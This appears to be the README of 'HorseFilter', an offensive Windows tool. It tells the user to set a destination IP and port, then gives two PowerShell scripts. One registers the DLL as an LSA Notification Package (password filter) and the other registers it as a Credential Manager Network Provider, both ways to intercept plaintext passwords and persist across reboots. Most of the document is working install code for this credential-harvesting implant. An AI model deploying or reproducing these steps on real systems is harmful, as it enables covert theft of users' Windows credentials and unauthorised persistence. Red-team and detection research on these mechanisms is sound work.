# HorseFilter
- i basically wanted to learn how [winfilter](https://github.com/kindtime/winfilter) works so i made this
- update destination port and IP macros in `shared/horsefilter.h`
- update file metadata in `shared/horsefilter.rc`
- i recommend compiling on linux with mingw-w64


## LSA Notification Package
1. place DLL anywhere in PATH
2. append DLL name (no extension) to registry key
3. reboot
```ps1
$DLLName = "horsefilter"

$Path = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$Value = "Notification Packages"

$Current = Get-ItemProperty -Path $Path -Name $Value
$New = $Current."$Value" + $DLLName

Set-ItemProperty -Path $Path -Name $Value -Value $New
```

## Credential Manager Network Provider
1. place DLL in a known path
2. add it to the network provider order key
3. create a network provider service key
<!-- 4. reboot -->

```ps1
$DLLName = "horsefilter"
$DLLPath = "%SystemRoot%\System32\" + $DLLName + ".dll"

$OrderPath = "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
$OrderValue = "ProviderOrder"

$CurrentOrder = Get-ItemProperty -Path $OrderPath -Name $OrderValue
$NewOrder = $CurrentOrder."$OrderValue" + "," + $DLLName

Set-ItemProperty -Path $OrderPath -Name $OrderValue -Value $NewOrder

$ServicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\" + $DLLName
New-Item -Path $ServicePath
# New-ItemProperty -Path $ServicePath -Name "Group" -Value "NetworkProvider"

$ServicePath += "\NetworkProvider"
New-Item -Path $ServicePath
 
New-ItemProperty -Path $ServicePath -Name "Class" -Value 0x00000002 # WN_CREDENTIAL_CLASS
New-ItemProperty -Path $ServicePath -Name "Name" -Value $DLLName
New-ItemProperty -Path $ServicePath -Name "ProviderPath" -PropertyType ExpandString -Value $DLLPath
```